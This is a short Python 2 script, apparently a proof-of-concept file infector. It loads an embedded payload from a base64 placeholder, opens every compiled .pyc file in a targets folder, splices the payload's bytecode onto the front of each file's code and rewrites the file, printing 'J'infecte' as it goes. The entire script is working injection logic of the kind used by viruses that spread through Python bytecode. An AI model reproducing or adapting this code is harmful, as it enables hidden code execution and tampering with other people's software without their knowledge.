import glob
import zlib
import base64
import marshal


Code = None
SetLineno = None

exec zlib.decompress(base64.b64decode("__BYTEPLAY_PLACEHOLDER__"))
payload = Code.from_code(marshal.loads(base64.b64decode("__PAYLOAD_PLACEHOLDER__")))


def infect(f_to_infect):
    f = open(f_to_infect, 'r')

    #Magic number and timestamp
    head = f.read(8)

    data = Code.from_code(marshal.loads(f.read()))

    print "J'infecte %s" % f_to_infect
    f.close()

    data.code[:0] = payload.code

    newfile = open(f_to_infect, 'w')
    newfile.write(head)
    marshal.dump(data.to_code(), newfile)
    newfile.close()


for i in glob.glob("./targets/*.pyc"):
    infect(i)

print "Fin injector"
